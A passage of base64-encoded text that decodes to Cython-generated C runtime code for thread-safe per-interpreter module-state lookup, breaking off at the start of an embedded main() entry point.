9WRVJTSU9OX18gPiAyMDExMTJMKSAmJiAhZGVmaW5lZChfX1NURENfTk9fVEhSRUFEU19fKVxuI2luY2x1ZGUgPHRocmVhZHMuaD5cbnN0YXRpYyBtdHhfdCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleDtcbnN0YXRpYyBvbmNlX2ZsYWcgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXhfb25jZV9mbGFnID0gT05DRV9GTEFHX0lOSVQ7XG5zdGF0aWMgdm9pZCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9pbml0aWFsaXplX211dGV4KHZvaWQpIHtcbiAgICBtdHhfaW5pdCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgsIG10eF9wbGFpbik7XG59XG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKVxcXG4gIGNhbGxfb25jZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXhfb25jZV9mbGFnLCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9pbml0aWFsaXplX211dGV4KTtcXFxuICBtdHhfbG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpIG10eF91bmxvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2VsaWYgZGVmaW5lZChIQVZFX1BUSFJFQURfSClcbiNpbmNsdWRlIDxwdGhyZWFkLmg+XG5zdGF0aWMgcHRocmVhZF9tdXRleF90IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gUFRIUkVBRF9NVVRFWF9JTklUSUFMSVpFUjtcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIHB0aHJlYWRfbXV0ZXhfbG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpIHB0aHJlYWRfbXV0ZXhfdW5sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNlbGlmIGRlZmluZWQoX1dJTjMyKVxuI2luY2x1ZGUgPFdpbmRvd3MuaD4gIC8vIHN5bmNoYXBpLmggb24gaXRzIG93biBkb2VzblwndCB3b3JrXG5zdGF0aWMgU1JXTE9DSyBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCA9IFNSV0xPQ0tfSU5JVDtcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIEFjcXVpcmVTUldMb2NrRXhjbHVzaXZlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgUmVsZWFzZVNSV0xvY2tFeGNsdXNpdmUoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2Vsc2VcbiNlcnJvciAiTm8gc3VpdGFibGUgbG9jayBhdmFpbGFibGUgZm9yIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFLlxcXG4gUmVxdWlyZXMgQyBzdGFuZGFyZCA+PSBDMTEsIG9yIEMrKyBzdGFuZGFyZCA+PSBDKysxMSxcXFxuIG9yIHB0aHJlYWRzLCBvciB0aGUgV2luZG93cyAzMiBBUEksIG9yIFB5dGhvbiA+PSAzLjEzLiJcbiNlbmRpZlxudHlwZWRlZiBzdHJ1Y3Qge1xuICAgIGludDY0X3QgaWQ7XG4gICAgUHlPYmplY3QgKm1vZHVsZTtcbn0gX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZTtcbnR5cGVkZWYgc3RydWN0IHtcbiAgICBjaGFyIGludGVycHJldGVyX2lkX2FzX2luZGV4O1xuICAgIFB5X3NzaXplX3QgY291bnQ7XG4gICAgUHlfc3NpemVfdCBhbGxvY2F0ZWQ7XG4gICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSB0YWJsZVsxXTtcbn0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhO1xuI2RlZmluZSBfX1BZWF9NT0RVTEVfU1RBVEVfTE9PS1VQX1NNQUxMX1NJWkUgMzJcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuc3RhdGljIF9fcHl4X2F0b21pY19pbnRfdHlwZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIgPSAwO1xuI2VuZGlmXG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbnN0YXRpYyBfX3B5eF9hdG9taWNfcHRyX3R5cGUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IDA7XG4jZWxzZVxuc3RhdGljIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSogX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IE5VTEw7XG4jZW5kaWZcbnN0YXRpYyBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoXG4gICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIHRhYmxlLFxuICAgICAgICBQeV9zc2l6ZV90IGNvdW50LFxuICAgICAgICBpbnQ2NF90IGludGVycHJldGVySWQpIHtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBiZWdpbiA9IHRhYmxlO1xuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGVuZCA9IGJlZ2luICsgY291bnQ7XG4gICAgaWYgKGJlZ2luLT5pZCA9PSBpbnRlcnByZXRlcklkKSB7XG4gICAgICAgIHJldHVybiBiZWdpbjtcbiAgICB9XG4gICAgd2hpbGUgKChlbmQgLSBiZWdpbikgPiBfX1BZWF9NT0RVTEVfU1RBVEVfTE9PS1VQX1NNQUxMX1NJWkUpIHtcbiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogaGFsZndheSA9IGJlZ2luICsgKGVuZCAtIGJlZ2luKS8yO1xuICAgICAgICBpZiAoaGFsZndheS0+aWQgPT0gaW50ZXJwcmV0ZXJJZCkge1xuICAgICAgICAgICAgcmV0dXJuIGhhbGZ3YXk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGhhbGZ3YXktPmlkIDwgaW50ZXJwcmV0ZXJJZCkge1xuICAgICAgICAgICAgYmVnaW4gPSBoYWxmd2F5O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgZW5kID0gaGFsZndheTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBmb3IgKDsgYmVnaW4gPCBlbmQ7ICsrYmVnaW4pIHtcbiAgICAgICAgaWYgKGJlZ2luLT5pZCA+PSBpbnRlcnByZXRlcklkKSByZXR1cm4gYmVnaW47XG4gICAgfVxuICAgIHJldHVybiBiZWdpbjtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfU3RhdGVfRmluZE1vZHVsZShDWVRIT05fVU5VU0VEIHZvaWQqIGR1bW15KSB7XG4gICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpO1xuICAgIGlmIChpbnRlcnByZXRlcl9pZCA9PSAtMSkgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIGRhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKilfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEpO1xuICAgIHtcbiAgICAgICAgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyKTtcbiAgICAgICAgaWYgKGxpa2VseShkYXRhKSkge1xuICAgICAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBuZXdfZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7XG4gICAgICAgICAgICBpZiAobGlrZWx5KGRhdGEgPT0gbmV3X2RhdGEpKSB7XG4gICAgICAgICAgICAgICAgZ290byByZWFkX2ZpbmlzaGVkO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7XG4gICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKTtcbiAgICAgICAgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyKTtcbiAgICAgICAgZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7XG4gICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpO1xuICAgIH1cbiAgcmVhZF9maW5pc2hlZDo7XG4jZWxzZVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSogZGF0YSA9IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGE7XG4jZW5kaWZcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBmb3VuZCA9IE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KCFkYXRhKSkgZ290byBlbmQ7XG4gICAgaWYgKGRhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7XG4gICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IGRhdGEtPmNvdW50KSB7XG4gICAgICAgICAgICBmb3VuZCA9IGRhdGEtPnRhYmxlK2ludGVycHJldGVyX2lkO1xuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgICAgZm91bmQgPSBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoXG4gICAgICAgICAgICBkYXRhLT50YWJsZSwgZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTtcbiAgICB9XG4gIGVuZDpcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpyZXN1bHQ9TlVMTDtcbiAgICAgICAgaWYgKGZvdW5kICYmIGZvdW5kLT5pZCA9PSBpbnRlcnByZXRlcl9pZCkge1xuICAgICAgICAgICAgcmVzdWx0ID0gZm91bmQtPm1vZHVsZTtcbiAgICAgICAgfVxuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4gICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7XG4jZW5kaWZcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG59XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbnN0YXRpYyB2b2lkIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycyh2b2lkKSB7XG4gICAgd2hpbGUgKF9fcHl4X2F0b21pY19sb2FkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpICE9IDApO1xufVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKClcbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGVJbnRlcnBJZEFzSW5kZXgoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICoqb2xkX2RhdGEsIFB5T2JqZWN0KiBtb2R1bGUsIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQpIHtcbiAgICBQeV9zc2l6ZV90IHRvX2FsbG9jYXRlID0gKCpvbGRfZGF0YSktPmFsbG9jYXRlZDtcbiAgICB3aGlsZSAodG9fYWxsb2NhdGUgPD0gaW50ZXJwcmV0ZXJfaWQpIHtcbiAgICAgICAgaWYgKHRvX2FsbG9jYXRlID09IDApIHRvX2FsbG9jYXRlID0gMTtcbiAgICAgICAgZWxzZSB0b19hbGxvY2F0ZSAqPSAyO1xuICAgIH1cbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm5ld19kYXRhID0gKm9sZF9kYXRhO1xuICAgIGlmICh0b19hbGxvY2F0ZSAhPSAoKm9sZF9kYXRhKS0+YWxsb2NhdGVkKSB7XG4gICAgICAgICBuZXdfZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKilyZWFsbG9jKFxuICAgICAgICAgICAgKm9sZF9kYXRhLFxuICAgICAgICAgICAgc2l6ZW9mKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSkrKHRvX2FsbG9jYXRlLTEpKnNpemVvZihfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKSk7XG4gICAgICAgIGlmICghbmV3X2RhdGEpIHtcbiAgICAgICAgICAgIFB5RXJyX05vTWVtb3J5KCk7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBuZXdfZGF0YS0+YWxsb2NhdGVkOyBpIDwgdG9fYWxsb2NhdGU7ICsraSkge1xuICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLmlkID0gaTtcbiAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZVtpXS5tb2R1bGUgPSBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIG5ld19kYXRhLT5hbGxvY2F0ZWQgPSB0b19hbGxvY2F0ZTtcbiAgICB9XG4gICAgbmV3X2RhdGEtPnRhYmxlW2ludGVycHJldGVyX2lkXS5tb2R1bGUgPSBtb2R1bGU7XG4gICAgaWYgKG5ld19kYXRhLT5jb3VudCA8IGludGVycHJldGVyX2lkKzEpIHtcbiAgICAgICAgbmV3X2RhdGEtPmNvdW50ID0gaW50ZXJwcmV0ZXJfaWQrMTtcbiAgICB9XG4gICAgKm9sZF9kYXRhID0gbmV3X2RhdGE7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9TdGF0ZV9Db252ZXJ0RnJvbUludGVycElkQXNJbmRleChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEpIHtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICpyZWFkID0gZGF0YS0+dGFibGU7XG4gICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSAqd3JpdGUgPSBkYXRhLT50YWJsZTtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICplbmQgPSByZWFkICsgZGF0YS0+Y291bnQ7XG4gICAgZm9yICg7IHJlYWQ8ZW5kOyArK3JlYWQpIHtcbiAgICAgICAgaWYgKHJlYWQtPm1vZHVsZSkge1xuICAgICAgICAgICAgd3JpdGUtPmlkID0gcmVhZC0+aWQ7XG4gICAgICAgICAgICB3cml0ZS0+bW9kdWxlID0gcmVhZC0+bW9kdWxlO1xuICAgICAgICAgICAgKyt3cml0ZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBkYXRhLT5jb3VudCA9IHdyaXRlIC0gZGF0YS0+dGFibGU7XG4gICAgZm9yICg7IHdyaXRlPGVuZDsgKyt3cml0ZSkge1xuICAgICAgICB3cml0ZS0+aWQgPSAwO1xuICAgICAgICB3cml0ZS0+bW9kdWxlID0gTlVMTDtcbiAgICB9XG4gICAgZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXggPSAwO1xufVxuc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGUoUHlPYmplY3QqIG1vZHVsZSwgQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkge1xuICAgIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTtcbiAgICBpZiAoaW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHJldHVybiAtMTtcbiAgICBpbnQgcmVzdWx0ID0gMDtcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCk7XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm9sZF9kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKVxuICAgICAgICAgICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIDApO1xuI2Vsc2VcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm9sZF9kYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTtcbiNlbmRpZlxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqbmV3X2RhdGEgPSBvbGRfZGF0YTtcbiAgICBpZiAoIW5ld19kYXRhKSB7XG4gICAgICAgIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKWNhbGxvYygxLCBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSk7XG4gICAgICAgIGlmICghbmV3X2RhdGEpIHtcbiAgICAgICAgICAgIHJlc3VsdCA9IC0xO1xuICAgICAgICAgICAgUHlFcnJfTm9NZW1vcnkoKTtcbiAgICAgICAgICAgIGdvdG8gZW5kO1xuICAgICAgICB9XG4gICAgICAgIG5ld19kYXRhLT5hbGxvY2F0ZWQgPSAxO1xuICAgICAgICBuZXdfZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXggPSAxO1xuICAgIH1cbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnMoKTtcbiAgICBpZiAobmV3X2RhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7XG4gICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSkge1xuICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfU3RhdGVfQWRkTW9kdWxlSW50ZXJwSWRBc0luZGV4KCZuZXdfZGF0YSwgbW9kdWxlLCBpbnRlcnByZXRlcl9pZCk7XG4gICAgICAgICAgICBnb3RvIGVuZDtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9TdGF0ZV9Db252ZXJ0RnJvbUludGVycElkQXNJbmRleChuZXdfZGF0YSk7XG4gICAgfVxuICAgIHtcbiAgICAgICAgUHlfc3NpemVfdCBpbnNlcnRfYXQgPSAwO1xuICAgICAgICB7XG4gICAgICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBsb3dlcl9ib3VuZCA9IF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZChcbiAgICAgICAgICAgICAgICBuZXdfZGF0YS0+dGFibGUsIG5ld19kYXRhLT5jb3VudCwgaW50ZXJwcmV0ZXJfaWQpO1xuICAgICAgICAgICAgYXNzZXJ0KGxvd2VyX2JvdW5kKTtcbiAgICAgICAgICAgIGluc2VydF9hdCA9IGxvd2VyX2JvdW5kIC0gbmV3X2RhdGEtPnRhYmxlO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGluc2VydF9hdCA8IG5ld19kYXRhLT5jb3VudCAmJiBsb3dlcl9ib3VuZC0+aWQgPT0gaW50ZXJwcmV0ZXJfaWQpKSB7XG4gICAgICAgICAgICAgICAgbG93ZXJfYm91bmQtPm1vZHVsZSA9IG1vZHVsZTtcbiAgICAgICAgICAgICAgICBnb3RvIGVuZDsgIC8vIGFscmVhZHkgaW4gdGFibGUsIG5vdGhpbmcgbW9yZSB0byBkb1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGlmIChuZXdfZGF0YS0+Y291bnQrMSA+PSBuZXdfZGF0YS0+YWxsb2NhdGVkKSB7XG4gICAgICAgICAgICBQeV9zc2l6ZV90IHRvX2FsbG9jYXRlID0gKG5ld19kYXRhLT5jb3VudCsxKSoyO1xuICAgICAgICAgICAgbmV3X2RhdGEgPVxuICAgICAgICAgICAgICAgIChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKXJlYWxsb2MoXG4gICAgICAgICAgICAgICAgICAgIG5ld19kYXRhLFxuICAgICAgICAgICAgICAgICAgICBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSArXG4gICAgICAgICAgICAgICAgICAgICh0b19hbGxvY2F0ZS0xKSpzaXplb2YoX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSkpO1xuICAgICAgICAgICAgaWYgKCFuZXdfZGF0YSkge1xuICAgICAgICAgICAgICAgIHJlc3VsdCA9IC0xO1xuICAgICAgICAgICAgICAgIG5ld19kYXRhID0gb2xkX2RhdGE7XG4gICAgICAgICAgICAgICAgUHlFcnJfTm9NZW1vcnkoKTtcbiAgICAgICAgICAgICAgICBnb3RvIGVuZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIG5ld19kYXRhLT5hbGxvY2F0ZWQgPSB0b19hbGxvY2F0ZTtcbiAgICAgICAgfVxuICAgICAgICArK25ld19kYXRhLT5jb3VudDtcbiAgICAgICAgaW50NjRfdCBsYXN0X2lkID0gaW50ZXJwcmV0ZXJfaWQ7XG4gICAgICAgIFB5T2JqZWN0ICpsYXN0X21vZHVsZSA9IG1vZHVsZTtcbiAgICAgICAgZm9yIChQeV9zc2l6ZV90IGk9aW5zZXJ0X2F0OyBpPG5ld19kYXRhLT5jb3VudDsgKytpKSB7XG4gICAgICAgICAgICBpbnQ2NF90IGN1cnJlbnRfaWQgPSBuZXdfZGF0YS0+dGFibGVbaV0uaWQ7XG4gICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0uaWQgPSBsYXN0X2lkO1xuICAgICAgICAgICAgbGFzdF9pZCA9IGN1cnJlbnRfaWQ7XG4gICAgICAgICAgICBQeU9iamVjdCAqY3VycmVudF9tb2R1bGUgPSBuZXdfZGF0YS0+dGFibGVbaV0ubW9kdWxlO1xuICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZSA9IGxhc3RfbW9kdWxlO1xuICAgICAgICAgICAgbGFzdF9tb2R1bGUgPSBjdXJyZW50X21vZHVsZTtcbiAgICAgICAgfVxuICAgIH1cbiAgZW5kOlxuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4gICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIG5ld19kYXRhKTtcbiNlbHNlXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IG5ld19kYXRhO1xuI2VuZGlmXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKENZVEhPTl9VTlVTRUQgdm9pZCogZHVtbXkpIHtcbiAgICBpbnQ2NF90IGludGVycHJldGVyX2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7XG4gICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gLTE7XG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpO1xuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpkYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKVxuICAgICAgICAgICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIDApO1xuI2Vsc2VcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhO1xuI2VuZGlmXG4gICAgaWYgKGRhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7XG4gICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IGRhdGEtPmNvdW50KSB7XG4gICAgICAgICAgICBkYXRhLT50YWJsZVtpbnRlcnByZXRlcl9pZF0ubW9kdWxlID0gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfVxuICAgIHtcbiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKCk7XG4gICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGxvd2VyX2JvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKFxuICAgICAgICAgICAgZGF0YS0+dGFibGUsIGRhdGEtPmNvdW50LCBpbnRlcnByZXRlcl9pZCk7XG4gICAgICAgIGlmICghbG93ZXJfYm91bmQpIGdvdG8gZG9uZTtcbiAgICAgICAgaWYgKGxvd2VyX2JvdW5kLT5pZCAhPSBpbnRlcnByZXRlcl9pZCkgZ290byBkb25lO1xuICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICplbmQgPSBkYXRhLT50YWJsZStkYXRhLT5jb3VudDtcbiAgICAgICAgZm9yICg7bG93ZXJfYm91bmQ8ZW5kLTE7ICsrbG93ZXJfYm91bmQpIHtcbiAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5pZCA9IChsb3dlcl9ib3VuZCsxKS0+aWQ7XG4gICAgICAgICAgICBsb3dlcl9ib3VuZC0+bW9kdWxlID0gKGxvd2VyX2JvdW5kKzEpLT5tb2R1bGU7XG4gICAgICAgIH1cbiAgICB9XG4gICAgLS1kYXRhLT5jb3VudDtcbiAgICBpZiAoZGF0YS0+Y291bnQgPT0gMCkge1xuICAgICAgICBmcmVlKGRhdGEpO1xuICAgICAgICBkYXRhID0gTlVMTDtcbiAgICB9XG4gIGRvbmU6XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgZGF0YSk7XG4jZWxzZVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEgPSBkYXRhO1xuI2VuZGlmXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7XG4gICAgcmV0dXJuIDA7XG59XG4jZW5kaWZcblxuXG4jaWZkZWYgX01TQ19WRVJcbiNwcmFnbWEgd2FybmluZyggcG9wIClcbiNlbmRpZlxuXG5cblxuXG4jZW5kaWYgXG5cbiNpZmRlZiBfX0ZyZWVCU0RfX1xuI2luY2x1ZGUgPGRlZGUuaD5cbiNlbmRpZlxuI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzXG5pbnQgbWFpbihpbnQgYXJnYywgY2hhcioqIGFyZ3YpIHtcbiNlbGlmIGRlZmluZWQoV2luMzIpIHx8IGRlZmluZWQoTVNfV0lORE9XUylcbmludCB3bWFpbihpbnQgYXJnYywgd2NoYXJfdCAqKmFyZ3YpIHtcbiNlbHNlXG5zdGF0aWMgaW50IF9fUHl4X21haW4oaW50IGFyZ2MsIHdjaGFyX3QgKiphcmd2KSB7XG4jZW5kaWZcbiNpZmRl